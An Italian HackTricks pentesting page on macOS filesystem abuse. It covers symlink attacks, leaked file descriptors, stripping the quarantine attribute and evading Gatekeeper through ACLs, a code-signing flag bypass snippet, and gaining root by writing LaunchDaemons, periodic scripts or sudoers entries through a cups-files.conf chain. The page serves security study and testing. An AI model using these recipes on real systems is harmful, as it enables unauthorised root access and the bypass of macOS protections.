# Trucchi del filesystem di macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Combinazioni di permessi POSIX

Per una **directory**, i tre bit dei permessi hanno un significato diverso rispetto a quello che hanno su un file normale. `chmod(1)` chiama il bit di esecuzione "**search**" quando viene applicato a una directory:<sup>[2]</sup>

> `0100` Per i file, consente l'esecuzione da parte del proprietario. Per le directory, consente al proprietario di **cercare** nella directory.

- **read** - è possibile **enumerare** le entry della directory (elencarne i nomi).
- **write** - è possibile **creare, rinominare ed eliminare le entry** nella directory. Si noti che questa è una proprietà della directory *contenitore*, non del file: è possibile eliminare un file che non si può leggere o modificare, purché si possa scrivere nella directory padre.
- Per eliminare una **subdirectory**, questa deve essere vuota, il che a sua volta richiede permessi sufficienti per rimuovere tutto ciò che contiene.
- Se la directory ha lo **sticky bit** (`S_ISVTX`, come `/tmp`), ciò è limitato — POSIX stabilisce che un processo può quindi rimuovere o rinominare file al suo interno solo se ne è il proprietario, se possiede la directory o se dispone dei privilegi appropriati.<sup>[1]</sup>
- **execute / search** - è consentito **attraversare** la directory. La risoluzione del pathname individua ogni componente "nella directory specificata dal suo predecessore", quindi la **perdita dei permessi di ricerca su un singolo componente del prefisso del path rende irraggiungibile tramite path tutto ciò che si trova al di sotto**, anche se il file finale è leggibile da tutti.<sup>[1]</sup>

### Combinazioni pericolose

**Come sovrascrivere un file/cartella di proprietà di root**, quando:

- Un proprietario di una **directory** padre nel path è l'utente
- Il proprietario di una **directory** padre nel path è un **gruppo di utenti** con **accesso in scrittura**
- Un **gruppo** di utenti ha **accesso in scrittura** al **file**

Con una qualsiasi delle combinazioni precedenti, un attacker potrebbe **iniettare** un **sym/hard link** nel path previsto per ottenere una scrittura arbitraria privilegiata.

### Caso speciale della cartella root R+X

Questo deriva direttamente dalla regola di risoluzione dei pathname descritta sopra. Se una **directory concede solo R+X a root**, i file al suo interno sono irraggiungibili *tramite path* per chiunque altro — ma i bit dei permessi propri dei **file** possono comunque essere permissivi. La directory è l'unico ostacolo.

Pertanto, qualsiasi primitive che consenta di far uscire il file da quella directory — un processo privilegiato che **sposta/rinomina/copia** un path scelto dall'attacker in una posizione che è possibile attraversare — si trasforma in una lettura arbitraria, senza mai dover aggirare i permessi del file stesso:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Cerca strumenti privilegiati che spostano file (installer, rotatori di log, collector di crash/diagnostica, funzionalita di backup ed "export") e che accettano un source path da un utente con privilegi inferiori.

## Symbolic Link / Hard Link

### File/cartella permissivi

Se un processo privilegiato scrive in un **file** che potrebbe essere **controllato** da un **utente con privilegi inferiori**, o che potrebbe essere stato **precedentemente creato** da un utente con privilegi inferiori. L'utente potrebbe semplicemente **puntarlo a un altro file** tramite un Symbolic o Hard link, e il processo privilegiato scrivera in quel file.

Controlla le altre sezioni per verificare dove un attacker potrebbe **abusare di un arbitrary write per elevare i privilegi**.

### Open `O_NOFOLLOW`

Secondo [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Se `O_NOFOLLOW` viene usato nella mask e il target file passato a `open()` e un symbolic link, allora `open()` fallira."* Viene controllato solo il componente **finale** — ogni componente **intermedio** viene comunque risolto e seguito. Quindi, uno sviluppatore che ha "protetto" una write con `O_NOFOLLOW` puo comunque essere attaccato piantando un symlink su una qualsiasi **parent directory** del target path.<sup>[3]</sup>

La stessa man page documenta i flag che chiudono effettivamente questa falla:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"se ... qualsiasi componente del path passato a `open()` e un symbolic link, allora `open()` fallira."*
- **`O_RESOLVE_BENEATH`** — *"se ... la risoluzione del path specificato esce dalla directory associata al fd, allora `openat()` fallira."*

In alternativa, `openat()` relativo a un directory FD che hai gia validato, oppure `realpath()` + una nuova validazione, sono i metodi rimanenti per impedire gli scambi di symlink durante la risoluzione del path.

## .fileloc

I file con estensione **`.fileloc`** possono puntare ad altre applicazioni o binary, quindi quando vengono aperti sara eseguita l'applicazione/il binary indicato.\
Esempio:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Se una chiamata a `open` non include il flag `O_CLOEXEC`, il file descriptor verrà ereditato dal processo figlio. Quindi, se un processo privilegiato apre un file privilegiato ed esegue un processo controllato dall'attacker, l'attacker **erediterà l'FD sul file privilegiato**.

L'esempio canonico è la **LPE `DYLD_PRINT_TO_FILE` in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` rispettava `DYLD_PRINT_TO_FILE=/path` anche nei **binary restricted (suid root)**, perché quella specifica variabile veniva analizzata al di fuori di `processDyldEnvironmentVariable()`.
- Eseguiva `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, quindi **creava un file di proprietà di root in un percorso arbitrario**.
- L'FD **non veniva mai chiuso e non aveva il flag close-on-exec**, quindi ogni processo figlio del binary suid ereditava un **FD scrivibile verso un file di proprietà di root**.
- Eseguendo, ad esempio, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` e leggendo poi nel processo figlio il numero dell'FD ereditato, si ottenevano scritture arbitrarie su file di proprietà di root; `fcntl(fd, F_SETFL, 0)` rimuoveva persino `O_APPEND`, permettendo di sovrascrivere invece di aggiungere in coda.

Lo stesso scenario si presenta ogni volta che un processo privilegiato apre un file **prima** di eseguire con `exec` qualcosa sotto il tuo controllo (helper tool, editor in stile `crontab` invocati tramite `$EDITOR`, file di log/debug aperti a partire da un percorso ottenuto da una variabile d'ambiente...). Enumera gli FD ereditati con:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Qualsiasi valore superiore a `2` che punti a un file che non puoi aprire autonomamente costituisce una primitive di arbitrary-write (o arbitrary-read).

## Evita i trucchi degli xattr di quarantine

### Rimuovilo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se un file/cartella ha questo attributo immutable, non sarà possibile applicarvi un xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### File system senza supporto xattr

Non tutti i file system che macOS può montare memorizzano nativamente gli **attributi estesi**. HFS+ e APFS lo fanno; **FAT32, exFAT e la maggior parte dei mount NFS non lo fanno** — macOS li emula scrivendo un file laterale **AppleDouble** denominato `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Questo è importante per la quarantine, perché l'xattr sopravvive solo se può essere effettivamente scritto **e riletto** dallo stesso volume:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Se il volume viene successivamente letto tramite un percorso che ignora il companion `._` (oppure il companion viene rimosso/eliminato), il file arriva **senza un flag di quarantine** — e una `.app` senza quarantine è sufficiente per eludere l'App Sandbox, come illustrato in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Questa ACL impedisce di aggiungere `xattrs` al file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Il formato di file **AppleDouble** copia un file, inclusi i relativi ACE.

Nel [**codice sorgente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale dell'ACL memorizzata nell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se si comprime un'applicazione in un file zip con il formato di file **AppleDouble** e con un ACL che impedisce la scrittura di altri xattr al suo interno... l'xattr quarantine non veniva impostato nell'applicazione:

Consultare il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) per ulteriori informazioni.<sup>[6]</sup>

Per replicare il problema, è innanzitutto necessario ottenere la stringa ACL corretta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Nota che anche se questo funziona, la sandbox scrive prima l'xattr di quarantine)

Non è realmente necessario, ma lo lascio lì per ogni evenienza:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass dei controlli della signature

### Bypass dei controlli sui platform binaries

Alcuni controlli di sicurezza verificano se il binary è un **platform binary**, ad esempio per consentire la connessione a un servizio XPC. Tuttavia, come illustrato in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, è possibile bypassare questo controllo ottenendo un platform binary (come /bin/ls) e iniettando l'exploit tramite dyld usando la variabile d'ambiente `DYLD_INSERT_LIBRARIES`.<sup>[7]</sup>

### Bypass dei flag `CS_REQUIRE_LV` e `CS_FORCED_LV`

È possibile per un binary in esecuzione modificare i propri flag per bypassare i controlli con un codice come il seguente:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass delle Code Signatures

I bundle contengono il file **`_CodeSignature/CodeResources`**, che contiene l'**hash** di ogni singolo **file** nel **bundle**. Nota che l'hash di CodeResources è anche **incorporato nell'eseguibile**, quindi non possiamo modificare neanche quello.

Tuttavia, esistono alcuni file la cui firma non verrà verificata; questi hanno la chiave `omit` nel plist, ad esempio:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
È possibile calcolare la firma di una risorsa dalla CLI con:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montare dmgs

Un utente può montare un dmg personalizzato creato anche sopra alcune cartelle esistenti. Ecco come creare un pacchetto dmg personalizzato con contenuti personalizzati:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Di solito macOS monta i dischi comunicando con il servizio Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornito da `/usr/libexec/diskarbitrationd`). Se si aggiunge il parametro `-d` al file plist di LaunchDaemons e si riavvia, i log verranno salvati in `/var/log/diskarbitrationd.log`.\
Tuttavia, è possibile utilizzare strumenti come `hdik` e `hdiutil` per comunicare direttamente con il kext `com.apple.driver.DiskImages`.

## Scritture arbitrarie

### Script sh periodici

Se il tuo script può essere interpretato come uno **shell script**, puoi sovrascrivere lo **shell script `/etc/periodic/daily/999.local`**, che verrà eseguito ogni giorno.

Puoi **simulare** l'esecuzione di questo script con: **`sudo periodic daily`**

### Daemon

Scrivi un **LaunchDaemon** arbitrario come **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, con un plist che esegua uno script arbitrario come segue:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genera semplicemente lo script `/Applications/Scripts/privesc.sh` con i **comandi** che vuoi eseguire come root.

### File sudoers

Se disponi di una **scrittura arbitraria**, potresti creare un file nella cartella **`/etc/sudoers.d/`** che ti conceda i privilegi **sudo**.

### File PATH

Il file **`/etc/paths`** è uno dei principali luoghi che popola la variabile d'ambiente PATH. Devi essere root per sovrascriverlo, ma se uno script eseguito da un **processo privilegiato** esegue un **comando senza il percorso completo**, potresti riuscire a fare un **hijack** modificando questo file.

Puoi anche scrivere file in **`/etc/paths.d`** per caricare nuove cartelle nella variabile d'ambiente `PATH`.

### cups-files.conf

Questa tecnica è stata utilizzata in [questo writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[8]</sup>

Crea il file `/etc/cups/cups-files.conf` con il seguente contenuto:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Questo creerà il file `/etc/sudoers.d/lpe` con permessi 777. Il testo spazzatura aggiuntivo alla fine serve ad attivare la creazione dell'error log.

Quindi, scrivi in `/etc/sudoers.d/lpe` la configurazione necessaria per effettuare una privilege escalation, come `%staff ALL=(ALL) NOPASSWD:ALL`.

Poi, modifica nuovamente il file `/etc/cups/cups-files.conf` indicando `LogFilePerm 700`, in modo che il nuovo file sudoers diventi valido invocando `cupsctl`.

### Sandbox Escape

È possibile evadere dalla macOS sandbox con una arbitrary write sul filesystem. Per alcuni esempi, consulta la pagina [macOS Auto Start](../../../../macos-auto-start-locations.md), ma un metodo comune consiste nello scrivere un file di preferenze di Terminal in `~/Library/Preferences/com.apple.Terminal.plist` che esegua un comando all'avvio e richiamarlo utilizzando `open`.

## Generare file scrivibili come altri utenti

Una primitive di privesc molto comune consiste nel fare in modo che un **processo privilegiato crei un file per te** in una directory che controlli, mantenendo poi **l'accesso in scrittura** a quel file. Sono necessari due elementi:

1. Una directory di tua proprietà (o in cui puoi impostare una **ACL ereditabile**), in modo che qualsiasi elemento creato al suo interno erediti i tuoi permessi.
2. Un processo privilegiato/`suid` a cui si possa indicare **dove** creare un file, in genere tramite una variabile d'ambiente di debug/logging, un file di configurazione o l'API XPC di un helper.

La parte relativa alla **ACL ereditabile** è ciò che rende il file creato scrivibile da te anche se appartiene a un altro utente. I flag di ereditarietà `file_inherit` / `directory_inherit` sono documentati in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Ora qualsiasi file creato da un processo privilegiato all'interno di `$DIRNAME` è **scrivibile da te**. Se quella directory è anche una posizione in cui in seguito viene **eseguito come root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, una directory di LaunchDaemon...), si tratta di una root escalation diretta. Consulta le sezioni [Sudoers File](#sudoers-file) e [cups-files.conf](#cups-filesconf) precedenti per sapere cosa scrivere una volta ottenuto il file.

Per un esempio completo della catena "una variabile d'ambiente fa sì che un processo root crei un file e il FD trapela fino a te", consulta [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) sopra.

## Memoria condivisa POSIX

La **POSIX shared memory** consente ai processi nei sistemi operativi conformi a POSIX di accedere a un'area di memoria comune, facilitando una comunicazione più rapida rispetto ad altri metodi di comunicazione tra processi. Essa prevede la creazione o l'apertura di un oggetto di memoria condivisa con `shm_open()`, l'impostazione delle sue dimensioni con `ftruncate()` e la sua mappatura nello spazio degli indirizzi del processo usando `mmap()`. I processi possono quindi leggere e scrivere direttamente in quest'area di memoria. Per gestire l'accesso concorrente e prevenire la corruzione dei dati, vengono spesso utilizzati meccanismi di sincronizzazione come mutex o semafori. Infine, i processi rimuovono la mappatura e chiudono la memoria condivisa con `munmap()` e `close()` e, facoltativamente, rimuovono l'oggetto di memoria con `shm_unlink()`. Questo sistema è particolarmente efficace per una comunicazione IPC efficiente e veloce negli ambienti in cui più processi devono accedere rapidamente a dati condivisi.

<details>

<summary>Esempio di codice del Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Esempio di codice consumer</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** sono una funzionalità di sicurezza introdotta in macOS per migliorare la sicurezza e l'affidabilità delle **operazioni sui file descriptor** nelle applicazioni utente. Questi guarded descriptors forniscono un modo per associare restrizioni specifiche, o "guard", ai file descriptor, che vengono applicate dal kernel.

Questa funzionalità è particolarmente utile per prevenire alcune classi di vulnerabilità di sicurezza, come **l'accesso non autorizzato ai file** o le **race condition**. Queste vulnerabilità si verificano, ad esempio, quando un thread accede a una file description dando **a un altro thread vulnerabile l'accesso a essa**, oppure quando un file descriptor viene **ereditato** da un processo figlio vulnerabile. Alcune funzioni correlate a questa funzionalità sono:

- `guarded_open_np`: apre un FD con un guard
- `guarded_close_np`: lo chiude
- `change_fdguard_np`: modifica i flag del guard su un descriptor (rimuovendo persino la protezione del guard)

## Riferimenti

- [1] [POSIX.1-2024 — Definizioni di base, Cap. 4 (Permessi di accesso ai file, Protezione delle directory, Risoluzione dei pathname)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Pagina man di [`chmod(1)`]](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit di ricerca/esecuzione delle directory, flag di ereditarietà ACL)
- [3] [Pagina man di [`open(2)`]](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - DYLD_PRINT_TO_FILE Local Privilege Escalation in OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD leaked senza close-on-exec)
- [5] [The Eclectic Light Company - Quali file system e cloud services preservano gli extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Il tallone d'Achille di Gatekeeper: alla scoperta di una vulnerabilità di macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Una nuova era dei Sandbox Escapes di macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Alla scoperta delle vulnerabilità Apple: la storia dell'audit di diskarbitrationd e storagekitd, parte 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
